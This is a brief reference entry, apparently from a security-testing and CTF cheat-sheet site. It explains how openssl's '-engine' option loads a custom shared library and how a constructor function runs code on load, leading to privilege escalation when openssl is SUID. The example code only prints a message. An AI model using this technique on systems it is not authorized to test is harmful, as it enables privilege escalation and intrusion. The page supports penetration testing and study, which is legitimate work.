---
title: openssl
description: A reference on features of the openssl binary, relevant for security testing, exploiting and CTF.
---

## Code execution/Privilege escalation

The binary `openssl` can be made to load custom libraries via `req -engine /library.so`. This can result in arbitrary
code  execution. If `openssl` has SUID set, this can also lead to privilege escalation.

```bash
openssl req -engine /path/to/custom/library.so
```

The easiest way to write a library in such a way that its code is executed by `openssl` is to add a library constructor
`__attribute__((constructor))`.

```c
void __attribute__ ((constructor)) constructor() {
    printf("I will be executed on library load!");
}
```

A ready-made codebase for getting code execution is available [here](https://github.com/jonasheschl/lib2shell-ssh-keygen).
This codebase also preserves the effective user id. Useful if `openssl` is run with SUID for example.

## References

1. [openssl man page](https://linux.die.net/man/1/openssl)
2. [Blog post by Sean Pesce](https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html)
3. [Modified lib2shell codebase for exploiting the ssh-keygen behaviour](https://github.com/jonasheschl/lib2shell-ssh-keygen)
